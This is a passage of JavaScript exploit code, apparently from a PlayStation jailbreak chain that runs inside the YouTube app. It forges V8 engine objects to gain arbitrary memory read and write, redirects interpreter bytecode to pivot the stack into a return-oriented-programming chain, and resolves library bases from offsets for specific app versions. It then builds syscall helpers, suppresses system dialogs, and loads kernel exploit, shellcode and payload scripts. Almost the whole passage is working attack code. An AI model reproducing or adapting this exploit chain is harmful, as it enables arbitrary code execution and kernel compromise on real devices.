        write64_unstable(fake_buffer_rw2_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #2 (buffer_rw2)
        write64_unstable(fake_buffer_rw2_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw2_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw2_obj + 0x10n, fake_buffer_rw2_elements + 1n);
        write64_unstable(fake_buffer_rw2_obj + 0x18n, 0x200n);  // byte_length
        write64_unstable(fake_buffer_rw2_obj + 0x20n, fake_rw2_data);  // backing_store
        write64_unstable(fake_buffer_rw2_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw2_obj + 0x30n, 0n);  // bit_field
        
        // Create fake BigUint64Array #2 elements
        write64_unstable(fake_arr2_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_arr2_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #2 (fake_arr2)
        write64_unstable(fake_arr2_obj + 0x00n, biguint_map);
        write64_unstable(fake_arr2_obj + 0x08n, biguint_props);
        write64_unstable(fake_arr2_obj + 0x10n, fake_arr2_elements + 1n);
        write64_unstable(fake_arr2_obj + 0x18n, fake_buffer_rw2_obj + 1n);
        write64_unstable(fake_arr2_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_arr2_obj + 0x28n, 0x200n);  // byte_length
        write64_unstable(fake_arr2_obj + 0x30n, 0x40n);  // length
        write64_unstable(fake_arr2_obj + 0x38n, fake_rw2_data);  // external_pointer
        write64_unstable(fake_arr2_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake BigUint64Array #1 elements
        write64_unstable(fake_rw_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rw_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #1 (fake_rw) - overlaps with fake_rw_data
        write64_unstable(fake_rw_obj + 0x00n, biguint_map);
        write64_unstable(fake_rw_obj + 0x08n, biguint_props);
        write64_unstable(fake_rw_obj + 0x10n, fake_rw_elements + 1n);
        write64_unstable(fake_rw_obj + 0x18n, fake_buffer_rw_obj + 1n);
        write64_unstable(fake_rw_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rw_obj + 0x28n, 0x1000n);  // byte_length
        write64_unstable(fake_rw_obj + 0x30n, 0x200n);  // length (increased to 512)
        write64_unstable(fake_rw_obj + 0x38n, fake_rw_data);  // external_pointer
        write64_unstable(fake_rw_obj + 0x40n, 0n);  // base_pointer
        
        // ArrayBuffer (0x00 - 0x37)
        write64_unstable(fake_bc_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_bc_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_bc_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_bc_buffer + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_bc_buffer + 0x20n, 0n);     // backing_store = NULL
        write64_unstable(fake_bc_buffer + 0x28n, 0n);     // extension
        write64_unstable(fake_bc_buffer + 0x30n, small_buffer_bit_field);
        
        // Padding (0x38 - 0x47) - 16 bytes of zeros
        write64_unstable(fake_bc_buffer + 0x38n, 0n);
        write64_unstable(fake_bc_buffer + 0x40n, 0n);
        
        // Elements (0x48 - 0x57)
        write64_unstable(fake_bc_elements + 0x00n, small_elem_map);
        write64_unstable(fake_bc_elements + 0x08n, small_elem_length_field);
        
        // BigUint64Array object (0x98 - 0xDF)
        write64_unstable(fake_bc_obj + 0x00n, small_map);
        write64_unstable(fake_bc_obj + 0x08n, small_props);
        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);  // elements (tagged)
        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);    // buffer (tagged)
        write64_unstable(fake_bc_obj + 0x20n, 0n);     // byte_offset
        write64_unstable(fake_bc_obj + 0x28n, 0x40n);  // byte_length = 64
        write64_unstable(fake_bc_obj + 0x30n, 0x8n);   // length = 8
        write64_unstable(fake_bc_obj + 0x38n, 0xfn);   // external_ptr = 15
        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);  // base_pointer (tagged)
        
        write64_unstable(fake_frame_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_frame_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_frame_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_frame_buffer + 0x18n, 0x40n);
        write64_unstable(fake_frame_buffer + 0x20n, 0n);
        write64_unstable(fake_frame_buffer + 0x28n, 0n);
        write64_unstable(fake_frame_buffer + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_frame_buffer + 0x38n, 0n);  // Padding ?
        write64_unstable(fake_frame_buffer + 0x40n, 0n);  // Padding
        
        write64_unstable(fake_frame_elements + 0x00n, small_elem_map);
        write64_unstable(fake_frame_elements + 0x08n, small_elem_length_field);
        
        // This looks like BigUint64Array but it is NOT!!!!
        // Using BigUint64Array for fake frame makes GC angry
        // Instead use double object
        // But I will leave BigUint64Array struct except map
        // So I can keep use the existing ROP code
        write64_unstable(fake_frame_obj + 0x00n, heap_number_map);
        write64_unstable(fake_frame_obj + 0x08n, small_props);
        write64_unstable(fake_frame_obj + 0x10n, fake_frame_elements + 1n);
        write64_unstable(fake_frame_obj + 0x18n, fake_frame_buffer + 1n);
        write64_unstable(fake_frame_obj + 0x20n, 0n);
        write64_unstable(fake_frame_obj + 0x28n, 0x40n);
        write64_unstable(fake_frame_obj + 0x30n, 0x8n);
        write64_unstable(fake_frame_obj + 0x38n, 0xfn);
        write64_unstable(fake_frame_obj + 0x40n, fake_frame_elements + 1n);
        
        for (let i = 0n; i < 0x40n; i += 8n) {
            write64_unstable(fake_bc_data + i, 0n);
            write64_unstable(fake_frame_data + i, 0n);
        }
        
        // Create fake rop_chain elements
        write64_unstable(fake_rop_chain_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rop_chain_elements + 0x08n, biguint_elem_len);
        
        // Create fake rop_chain ArrayBuffer elements
        write64_unstable(fake_rop_chain_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_rop_chain_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake rop_chain ArrayBuffer
        write64_unstable(fake_rop_chain_buffer_obj + 0x00n, buffer_map);
        write64_unstable(fake_rop_chain_buffer_obj + 0x08n, buffer_props);
        write64_unstable(fake_rop_chain_buffer_obj + 0x10n, fake_rop_chain_buffer_elements + 1n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x18n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_buffer_obj + 0x20n, fake_rop_chain_data);  // backing_store
        write64_unstable(fake_rop_chain_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_rop_chain_buffer_obj + 0x30n, 0n);  // bit_field
        
        // Create fake rop_chain BigUint64Array (external storage)
        write64_unstable(fake_rop_chain_obj + 0x00n, biguint_map);
        write64_unstable(fake_rop_chain_obj + 0x08n, biguint_props);
        write64_unstable(fake_rop_chain_obj + 0x10n, fake_rop_chain_elements + 1n);
        write64_unstable(fake_rop_chain_obj + 0x18n, fake_rop_chain_buffer_obj + 1n);
        write64_unstable(fake_rop_chain_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rop_chain_obj + 0x28n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_obj + 0x30n, 0x100n);  // length
        write64_unstable(fake_rop_chain_obj + 0x38n, fake_rop_chain_data);  // external_pointer
        write64_unstable(fake_rop_chain_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake return_value_buf elements (inline storage)
        write64_unstable(fake_return_value_elements + 0x00n, small_elem_map);
        write64_unstable(fake_return_value_elements + 0x08n, small_elem_length_field);
        
        // Create fake return_value_buf ArrayBuffer elements
        write64_unstable(fake_return_value_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_return_value_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake return_value_buf ArrayBuffer
        write64_unstable(fake_return_value_buffer_obj + 0x00n, small_buffer_map);
        write64_unstable(fake_return_value_buffer_obj + 0x08n, small_buffer_props);
        write64_unstable(fake_return_value_buffer_obj + 0x10n, small_buffer_elements);
        write64_unstable(fake_return_value_buffer_obj + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_buffer_obj + 0x20n, 0n);  // backing_store = null
        write64_unstable(fake_return_value_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_return_value_buffer_obj + 0x30n, small_buffer_bit_field);
        
        // Create fake return_value_buf BigUint64Array (inline storage)
        write64_unstable(fake_return_value_obj + 0x00n, small_map);
        write64_unstable(fake_return_value_obj + 0x08n, small_props);
        write64_unstable(fake_return_value_obj + 0x10n, fake_return_value_elements + 1n);
        write64_unstable(fake_return_value_obj + 0x18n, fake_return_value_buffer_obj + 1n);
        write64_unstable(fake_return_value_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_return_value_obj + 0x28n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_obj + 0x30n, 0x8n);  // length
        write64_unstable(fake_return_value_obj + 0x38n, 0xfn);  // external_pointer
        write64_unstable(fake_return_value_obj + 0x40n, fake_return_value_elements + 1n);  // base_pointer
        
        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
        const fake_array = create_fakeobj_unstable(fake_array_obj);
        
        // Calculate offsets for accessing via fake_rw
        const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
        const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
        
        // Stable primitives
        addrof = function(obj) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_array[0] = obj;
            const addr = fake_rw[fake_array_slot0_offset] - 1n;
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return addr;
        }
        
        read64 = function(addr) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            const value = fake_arr2[0];
            fake_rw[arr2_external_offset] = arr2_external_org;
            return value;
        }
        
        write64 = function(addr, value) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            fake_arr2[0] = value;
            fake_rw[arr2_external_offset] = arr2_external_org;
        }
        
        create_fakeobj = function(addr) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_rw[fake_array_slot0_offset] = addr + 1n;
            const fake_obj = fake_array[0];
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return fake_obj;
        }                

        read8 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
        }

        write8 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }

        read16 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
        }
        
        write16 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        read32 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
        }

        write32 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        get_backing_store = function(typed_array) {
            const obj_addr = addrof(typed_array);
            const external = read64(obj_addr + 0x38n);
            const base = read64(obj_addr + 0x40n);
            return base + external;
        }
        
        malloc = function(size) {
            const buffer = new ArrayBuffer(Number(size));
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x20n);
            allocated_buffers.push(buffer);
            return backing_store;
        }

        // Fast bulk read: temporarily repoints a real ArrayBuffer backing store at the
        // target address, does one native memmove, then restores it (GC-safe).
        // Native-speed replacement for per-byte read8 loops (used by update/icon checks).
        addr_to_u8copy = function(addr, size) {
            const n = Number(size);
            const buffer = new ArrayBuffer(n);
            const buffer_addr = addrof(buffer);
            const org = read64(buffer_addr + 0x20n);
            write64(buffer_addr + 0x20n, addr);   // hijack backing store
            const view = new Uint8Array(buffer);
            const copy = new Uint8Array(n);       // our own stable memory
            copy.set(view);                       // one native bulk copy
            write64(buffer_addr + 0x20n, org);    // restore original backing store
            return copy;
        };
        
        await log("Stable primitive achieved");
        
        await log("Setting up ROP...");
        
        // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
        // We don't have pointer compression
        
        // Make bytecode larger and just use it's address
        // No separate fake bytecode buffer
        pwn = function(x) {
            let dummy1 = x + 1;
            let dummy2 = x + 2;
            let dummy3 = x + 3;
            let dummy4 = x + 4;
            let dummy5 = x + 5;
            return x;
        }
        
        pwn(1); // Generate bytecode
        
        get_bytecode_addr = function() {
            const pwn_addr = addrof(pwn); // JSFunction
            const sfi_addr = read64(pwn_addr + 0x18n) - 1n; // SharedFunctionInfo
            const bytecode_addr = read64(sfi_addr + 0x8n) - 1n; // BytecodeArray
            return bytecode_addr;
        }
        
        rop_chain = create_fakeobj(fake_rop_chain_obj);
        fake_bc = create_fakeobj(fake_bc_obj);
        fake_frame = create_fakeobj(fake_frame_obj);
        return_value_buf = create_fakeobj(fake_return_value_obj);
        
        //await log("fake_bc @ " + toHex(addrof(fake_bc)));
        //await log("fake_frame @ " + toHex(addrof(fake_frame)));
        
        const bytecode_addr = get_bytecode_addr();
        //await log("BytecodeArray @ " + toHex(bytecode_addr));
        
        bc_start = bytecode_addr + 0x36n;
        write64(bc_start, 0xAB0025n);
        
        const stack_addr = addrof(pwn(1)) + 0x1n;
        await log("Stack leak @ " + toHex(stack_addr));
        
        const text_leak = read64(stack_addr + 0x8n);
        await log("Text leak @ " + toHex(text_leak));
        
        const cbn = get_cobalt_buildnumber();
        
        if (cbn === "305777") {
            Y2_VERSION = "01.000.003 (min fw 4.03)";
            await log("Youtube " + Y2_VERSION + " detected");
            Y2_OFFSET = Y2_OFFSET_403;
            ROP = ROP_403;
            
            eboot_base = read64(stack_addr + 0x8n) - Y2_OFFSET.EBOOT_LEAK;
            await log("eboot_base @ " + toHex(eboot_base));

            libc_base = read64(eboot_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
            await log("libc_base @ " + toHex(libc_base));
            
        } else if (cbn === "18441022") {
            Y2_VERSION = "01.000.030 (min fw 12.20)";
            await log("Youtube " + Y2_VERSION + " detected");
            Y2_OFFSET = Y2_OFFSET_1220;
            ROP = ROP_1220;

            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
            await log("libcobalt_base @ " + toHex(libcobalt_base));
            
            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
            await log("libstarboard_base @ " + toHex(libstarboard_base));
            
            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
            await log("libc_base @ " + toHex(libc_base));
            
        } else if (cbn === "05730512") {
            Y2_VERSION = "01.009.202 (min fw 13.20)";
            await log("Youtube " + Y2_VERSION + " detected");
            Y2_OFFSET = Y2_OFFSET_1320;
            ROP = ROP_1320;

            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
            await log("libcobalt_base @ " + toHex(libcobalt_base));
            
            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
            await log("libstarboard_base @ " + toHex(libstarboard_base));
            
            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
            await log("libc_base @ " + toHex(libc_base));
            
        } else if (cbn === "06170617") {
            Y2_VERSION = "01.009.253 (min fw 13.40)";
            await log("Youtube " + Y2_VERSION + " detected");
            Y2_OFFSET = Y2_OFFSET_1340;
            ROP = ROP_1340;

            libcobalt_base = read64(stack_addr + 0x8n) - Y2_OFFSET.LIBCOBALT_LEAK;
            await log("libcobalt_base @ " + toHex(libcobalt_base));
            
            libstarboard_base = read64(libcobalt_base + Y2_OFFSET.LIBSTARBOARD_LEAK1) - Y2_OFFSET.LIBSTARBOARD_LEAK2;
            await log("libstarboard_base @ " + toHex(libstarboard_base));
            
            libc_base = read64(libstarboard_base + Y2_OFFSET.LIBC_LEAK1) - Y2_OFFSET.LIBC_LEAK2;
            await log("libc_base @ " + toHex(libc_base));
        } else {
            throw new Error("UNSUPPORTED YOUTUBE VERSION");
        }
        
        const rop_chain_addr = get_backing_store(rop_chain);
        await log("ROP chain @ " + toHex(rop_chain_addr));
        
        // Fake bytecode for r14 register
        fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
        const fake_bc_addr = get_backing_store(fake_bc);
        //await log("Fake bytecode @ " + toHex(fake_bc_addr));
        
        const fake_frame_backing = get_backing_store(fake_frame);
        
        // This sets the r14 register which V8 expects to point to bytecode
        write64(fake_frame_backing + 0x21n, fake_bc_addr);
        
        return_value_addr = get_backing_store(return_value_buf);
        //await log("return_value_addr @ " + toHex(return_value_addr));

        const fake_frame_addr = addrof(fake_frame);
        // Pivot RSP
        write64(fake_frame_addr + 0x9n, ROP.pop_rsp); // pop rsp ; ret
        write64(fake_frame_addr + 0x9n + Y2_OFFSET.RSP_OFFSET, rop_chain_addr);
        
        await log("fake_frame_addr @ " + toHex(fake_frame_addr));
        
        call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            let rop_i = 0;
            
            // Syscall number
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = rax;
            
            // Setup arguments
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = arg1;
            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
            rop_chain[rop_i++] = arg2;
            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
            rop_chain[rop_i++] = arg3;
            rop_chain[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
            rop_chain[rop_i++] = arg4;
            rop_chain[rop_i++] = ROP.pop_r8; // pop r8 ; ret
            rop_chain[rop_i++] = arg5;
            rop_chain[rop_i++] = ROP.pop_r9; // pop r9 ; ret
            rop_chain[rop_i++] = arg6;

            // Call function
            rop_chain[rop_i++] = address; 
            
            // Store return value to return_value_addr
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
            
            // Return safe tagged value to JavaScript
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret

            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret ;
            rop_chain[rop_i++] = saved_fp;
            
            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
            
            return pwn(fake_frame);
        }
        
        call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            
            saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n); //Ldar 0x3, Star fp, Return
            
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        await log("ROP test, should see 0x0000000200000000");
        
        rop_test = call(ROP.mov_rax_0x200000000);
        await log(toHex(rop_test));
        
        if (rop_test !== 0x200000000n) {
            await log("ERROR: ROP test failed");
            throw new Error("ROP test failed");
        }

        // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
        const sceKernelGetModuleInfoFromAddr_addr = read64(Y2_OFFSET.sceKernelGetModuleInfoFromAddr);
        
        //gettimeofday plt
        //0x113B18
        const gettimeofday_addr = read64(Y2_OFFSET.gettimeofday);
        //await log("gettimeofday_addr @: " + toHex(gettimeofday_addr));
        
        const mod_info = malloc(0x300);
        //await log("mod_info buffer @ " + toHex(mod_info));
        
        const SEGMENTS_OFFSET = 0x160n;
        
        ret = call(sceKernelGetModuleInfoFromAddr_addr, gettimeofday_addr, 0x1n, mod_info);
        //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));

        if (ret !== 0x0n) {
            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }
        
        libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
        //await log("libkernel_base @ " + toHex(libkernel_base));

        syscall_wrapper = gettimeofday_addr + 0x7n;
        //await log("syscall_wrapper @ " + toHex(syscall_wrapper));
        
        syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            if(syscall_num === undefined) {
                throw new Error("ERROR: syscall not defined");
            }
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        libc_strerror = Y2_OFFSET.libc_strerror;
        libc_error = Y2_OFFSET.libc_error;
        
        Thrd_create = Y2_OFFSET.Thrd_create;
        Thrd_join = Y2_OFFSET.Thrd_join;

        await load_localscript('misc.js');

        window.original_send_notification = window.send_notification;
        window.send_notification = function(text) {
            let isSystemNotify = false;
            if (typeof text === 'string') {
                const lowerText = text.toLowerCase();
                if (lowerText.includes("[error]") || lowerText.includes("[-]") || 
                    lowerText.includes("error") || lowerText.includes("failed") || 
                    lowerText.includes("exception") || lowerText.includes("lapse") || 
                    lowerText.includes("jailbroken") || lowerText.includes("exploit")) {
                    isSystemNotify = true;
                }
            }
            
            if (isSystemNotify && typeof window.original_send_notification === 'function') {
                window.original_send_notification(text);
            }

            if (typeof window.uiLog === 'function') {
                window.uiLog(text, isSystemNotify ? "error" : "info");
            }
        };

        await checkLogServer();

        if (Y2_OFFSET === Y2_OFFSET_403) {
            // Thanks ufm42 for better implementation
            await log("Disabling PSN dialog and YouTube splash...");
    
            const window_addr = addrof(window);
            //await log("window_addr: " + toHex(window_addr));
            
            const wrapper_private_addr = read64(window_addr + 0x20n);
            //await log("wrapper_private_addr: " + toHex(wrapper_private_addr));
            
            const isolate_addr = read64(wrapper_private_addr + 0x8n);
            //await log("isolate_addr: " + toHex(isolate_addr));
            
            const splash_screen_dom_window_addr = read64(wrapper_private_addr + 0x10n);
            //await log("splash_screen_dom_window_addr: " + toHex(splash_screen_dom_window_addr));
            
            const navigator_addr = read64(splash_screen_dom_window_addr + 0xC0n);
            //await log("navigator_addr: " + toHex(navigator_addr));
            
            const maybe_freeze_callback_addr = read64(navigator_addr + 0xB0n);
            //await log("maybe_freeze_callback_addr: " + toHex(maybe_freeze_callback_addr));
            
            const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
            //await log("browser_module_addr: " + toHex(browser_module_addr));
            
            const main_web_module_addr = read64(browser_module_addr + 0x678n);
            //await log("main_web_module_addr: " + toHex(main_web_module_addr));
            
            const main_web_module_impl_addr = read64(main_web_module_addr + 0x18n);
            //await log("main_web_module_impl_addr: " + toHex(main_web_module_impl_addr));
            
            const main_dom_window_addr = read64(main_web_module_impl_addr + 0x230n);
            //await log("main_dom_window_addr: " + toHex(main_dom_window_addr));
            
            const splash_screen_addr = read64(browser_module_addr + 0x898n);
            //await log("splash_screen_addr: " + toHex(splash_screen_addr));
            
            const splash_screen_web_module_addr = read64(splash_screen_addr + 0x20n);
            //await log("splash_screen_web_module_addr: " + toHex(splash_screen_web_module_addr));
            
            const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
            //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));
    
            await log("Disabling YouTube splash screen...");
            const main_web_module_generation_addr = browser_module_addr + 0xB08n;
            write32(main_web_module_generation_addr, 0xFFFFFFFFn);
            await log("YT splash disabled!");
    
            await log("Disabling PSN popup...");
            
            call(read64(Y2_OFFSET.sceMsgDialogTerminate));
                    
            // Disable "no internet connection" retry timer
            const on_error_retry_timer_addr = browser_module_addr + 0x960n;
            //await log("on_error_retry_timer_addr: " + toHex(on_error_retry_timer_addr));
            
            const is_running_addr = on_error_retry_timer_addr + 0x60n;
            //await log("is_running_addr: " + toHex(is_running_addr));
            
            // Set is_running to 1 (true)
            write8(is_running_addr, 0x1n);
            
            await log("PSN popup disabled!");
            
        } else {
            
            // This is voodoo hack
            await log("Disabling PSN and no internet popup...");
            
            const sceMsgDialogTerminate   = read64(Y2_OFFSET.sceMsgDialogTerminate);
            const sceErrorDialogTerminate = read64(Y2_OFFSET.sceErrorDialogTerminate);
            
            const timespec = malloc(0x10);
            write64(timespec,      0n);       // tv_sec  = 0
            write64(timespec + 8n, 1000000n); // tv_nsec = 1ms
                        
            while (call(sceMsgDialogTerminate) !== 0n) {
                call(sceErrorDialogTerminate);
                syscall(SYSCALL.nanosleep, timespec);
            }
            
            await log("Popup disabled!");
        }
        
        
        FW_VERSION = get_fwversion();
        TITLE_ID = get_title_id();
        
        send_notification("FW : " + FW_VERSION + "\nTitle ID : " + TITLE_ID + "\nAppVer : " + Y2_VERSION);
        await log("FW detected : " + FW_VERSION);
        await log("Title ID detected : " + TITLE_ID);
        await log("AppVer detected : " + Y2_VERSION);
        
        await log("libkernel_base @ " + toHex(libkernel_base));

        await load_localscript('kernel.js');
        await load_localscript('aioshellcode.js');
        
        ////////////////////
        // MAIN EXECUTION //
        ////////////////////

        await load_localscript('lapse.js');
        await load_localscript('relapse.js');
        await load_localscript('update.js');
        await load_localscript('icon_update.js');
        await load_localscript('autoload.js');
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(20, "Running kernel exploit...");
        }

        let exploit_success = false;

        const has_net = has_network_interface();
        const relapse_supported = compare_version(FW_VERSION, "7.00") >= 0 &&
                                  compare_version(FW_VERSION, "13.60") <= 0 &&
                                  FW_VERSION !== "9.05" &&
                                  FW_VERSION !== "11.40";

        if (relapse_supported && has_net) {
            exploit_success = await start_relapse();
        } else if (compare_version(FW_VERSION, "10.01") <= 0) {
            exploit_success = await start_lapse();
        } else if (compare_version(FW_VERSION, "13.60") <= 0) {
            exploit_success = await start_relapse();
        } else {
            send_notification("[ERROR] Unsupported fw: " + FW_VERSION);
            await kill_youtube(5000);
            return;
        }

        if (!exploit_success) {
            await kill_youtube(5000);
            return;
        }

        if (typeof window.updateProgress === 'function') {
            window.updateProgress(50, "Kernel exploit finished.");
        }

        if (!is_jailbroken()) {
            send_notification("[ERROR] Jailbreak failed");
            await kill_youtube(5000);
            return;
        }

        await start_update();
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(75, "Syncing icon...");
        }
        await start_icon_update();
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(90, "Sending payloads...");
        }
        await sleep(700);
        await start_autoload();

        if (typeof window.updateProgress === 'function') {
            window.updateProgress(100, "Autoload finished.");
        }

    } catch (e) {                
        if (typeof window.hideUI === 'function') window.hideUI();
        await log('EXCEPTION: ' + e.message);
        await log(e.stack);
        if (typeof send_notification === 'function') {
            send_notification("[ERROR] Y2JB exception: " + e.message);
        }
        await kill_youtube();
    }
    
})();
